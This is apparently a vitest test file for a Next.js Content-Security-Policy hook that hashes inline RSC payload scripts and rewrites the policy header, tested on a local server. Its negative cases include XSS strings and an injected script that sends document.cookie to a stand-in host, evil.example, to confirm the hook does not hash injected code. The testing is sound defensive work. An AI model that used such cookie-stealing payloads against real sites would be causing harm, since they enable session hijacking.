import { createHash } from "node:crypto";
import { createRequire } from "node:module";
import http from "node:http";
import type { AddressInfo } from "node:net";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

const require = createRequire(import.meta.url);
process.env.KKT_CSP_HOOK = "off"; // install() is called explicitly below, for this test's server only
const hook = require("../csp-hook.cjs") as {
  PLACEHOLDER: string;
  isFrameworkScript(source: string): boolean;
  inlineScriptHashes(html: string): string[];
  applyHashes(policy: string, html: string): string;
  instrument(req: http.IncomingMessage, res: http.ServerResponse): void;
};

const sha = (s: string) => `'sha256-${createHash("sha256").update(s, "utf8").digest("base64")}'`;
const POLICY = `default-src 'self'; script-src 'self' ${"'kkt-inline-hashes'"}; object-src 'none'`;
const HTML = [
  "<!doctype html><html><head>",
  '<script src="/_next/static/chunks/main.js" async=""></script>',
  '<script type="application/ld+json">{"@type":"Organization"}</script>',
  "</head><body>",
  "<script>self.__next_f=self.__next_f||[];self.__next_f.push([0])</script>",
  '<script>self.__next_f.push([1,"a\\u003cb"])</script>',
  "<script>self.__next_f=self.__next_f||[];self.__next_f.push([0])</script>",
  '<script type="module">import("/x.js")</script>',
  "</body></html>",
].join("");

describe("csp-hook: inline-script hashes", () => {
  it("hashes every Next.js payload script once; external scripts, JSON-LD data blocks and other inline code are not listed", () => {
    expect(hook.inlineScriptHashes(HTML)).toEqual([
      sha("self.__next_f=self.__next_f||[];self.__next_f.push([0])"),
      sha('self.__next_f.push([1,"a\\u003cb"])'),
    ]);
  });

  it("only vouches for the RSC payload shape: an inline script injected into the HTML gets no hash (the browser blocks it)", () => {
    for (const ok of [
      "(self.__next_f=self.__next_f||[]).push([0])",
      "(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])",
      'self.__next_f.push([1,"0:{\\"P\\":null};)]\\u003c/script>"])',
      'self.__next_f.push([1,"a"]);\nself.__next_f.push([3,"b"])',
    ])
      expect(hook.isFrameworkScript(ok), ok).toBe(true);
    for (const bad of [
      "alert(document.cookie)",
      'self.__next_f.push([1,"x"]);alert(1)',
      'self.__next_f.push([1,"x"]),alert(1)',
      "self.__next_f.push([1,alert(1)])",
      "self.__next_f.push({})",
      "self.__next_f=self.__next_f||[].constructor.constructor('alert(1)')()",
      'self.__next_f.push([1,"x"])//',
      "",
    ])
      expect(hook.isFrameworkScript(bad), bad).toBe(false);
    const injected = `${HTML.replace("</body>", "<script>fetch('//evil.example/'+document.cookie)</script></body>")}`;
    expect(hook.inlineScriptHashes(injected)).toEqual(hook.inlineScriptHashes(HTML));
    expect(hook.applyHashes(POLICY, injected)).not.toContain(sha("fetch('//evil.example/'+document.cookie)"));
  });

  it("replaces the placeholder in the policy (and drops it for a page without inline scripts)", () => {
    expect(hook.applyHashes(POLICY, HTML)).toBe(
      `default-src 'self'; script-src 'self' ${hook.inlineScriptHashes(HTML).join(" ")}; object-src 'none'`,
    );
    expect(hook.applyHashes(POLICY, "<p>no scripts</p>")).toBe(
      "default-src 'self'; script-src 'self'; object-src 'none'",
    );
  });
});

describe("csp-hook: on a real HTTP server", () => {
  let server: http.Server;
  let base: string;
  beforeAll(async () => {
    server = http.createServer((req, res) => {
      hook.instrument(req, res);
      const url = req.url ?? "/";
      if (url === "/json") {
        res.setHeader("content-security-policy", POLICY);
        res.setHeader("content-type", "application/json");
        return res.end('{"ok":true}');
      }
      if (url === "/nonce") {
        res.setHeader("content-security-policy", "script-src 'self' 'nonce-abc'");
        res.setHeader("content-type", "text/html");
        return res.end(HTML);
      }
      if (url === "/304") {
        res.setHeader("content-security-policy", POLICY);
        res.statusCode = 304;
        return res.end();
      }
      res.setHeader("content-security-policy", POLICY);
      if (url === "/writehead") {
        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      } else res.setHeader("content-type", "text/html; charset=utf-8");
      res.flushHeaders(); // streaming renders flush early: must not commit the placeholder
      // streamed in pieces, the last script split across chunks
      const mid = HTML.indexOf("push([1");
      res.write(HTML.slice(0, mid));
      res.write(Buffer.from(HTML.slice(mid)));
      res.end();
    });
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
    base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  });
  afterAll(async () => {
    await new Promise<void>((r) => server.close(() => r()));
  });

  for (const path of ["/stream", "/writehead"]) {
    it(`an HTML response carrying the placeholder leaves with the hashes of its own body (${path})`, async () => {
      const res = await fetch(`${base}${path}`);
      const body = await res.text();
      expect(body).toBe(HTML);
      const csp = res.headers.get("content-security-policy") ?? "";
      expect(csp).not.toContain(hook.PLACEHOLDER);
      for (const h of hook.inlineScriptHashes(HTML)) expect(csp).toContain(h);
      expect(res.headers.get("content-length")).toBe(String(Buffer.byteLength(HTML)));
    });
  }

  it("a 304 drops the placeholder policy so the browser keeps the one stored with the 200", async () => {
    const res = await fetch(`${base}/304`);
    expect(res.status).toBe(304);
    expect(res.headers.get("content-security-policy")).toBeNull();
  });

  it("non-HTML responses and nonce policies pass through untouched", async () => {
    const j = await fetch(`${base}/json`);
    expect(await j.text()).toBe('{"ok":true}');
    const n = await fetch(`${base}/nonce`);
    expect(n.headers.get("content-security-policy")).toBe("script-src 'self' 'nonce-abc'");
    expect(await n.text()).toBe(HTML);
  });
});
